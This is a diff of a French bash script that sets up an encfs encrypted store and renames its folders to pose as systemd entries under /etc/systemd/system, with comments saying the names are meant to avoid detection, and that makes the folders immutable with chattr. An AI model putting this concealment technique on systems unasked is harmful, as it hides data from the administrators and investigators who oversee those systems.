@@ -3,8 +3,8 @@
 set -e
 
 REPERTOIRE_COURANT=$(pwd)
-DOSSIER_CHIFFRE="/etc/system/systemd/.load_net" #Nom de dossier bizarre pour eviter la detection
-DOSSIER_MONTE="/etc/system/systemd/network_cache" #Nom de dossier bizarre pour eviter la detection
+DOSSIER_CHIFFRE="/etc/systemd/system/load_net" #Nom de dossier bizarre pour eviter la detection
+DOSSIER_MONTE="/etc/systemd/system/networrk" #Nom de dossier bizarre pour eviter la detection
 
 HASH_REFERENCE="dc08160901551a78c7e63598654103d8e808579a175203161be05933f0d8376a"
 
@@ -33,8 +33,6 @@ creer_encfs() {
     sudo mkdir -p "$DOSSIER_MONTE"
     sudo chown root:root "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
     sudo chmod 755 "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
-    sudo chattr +i "$DOSSIER_CHIFFRE"
-    sudo chattr +i "$DOSSIER_MONTE"
     expect << EOF
 spawn encfs "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
 expect "?>"
@@ -70,6 +68,8 @@ copier_donnees() {
 finaliser_chiffrement() {
     fusermount -u "$DOSSIER_MONTE"
     echo "CHIFFREMENT TERMINER"
+    sudo chattr +i "$DOSSIER_CHIFFRE"
+    sudo chattr +i "$DOSSIER_MONTE"
 }
 
 if ! generer_mot_de_passe; then
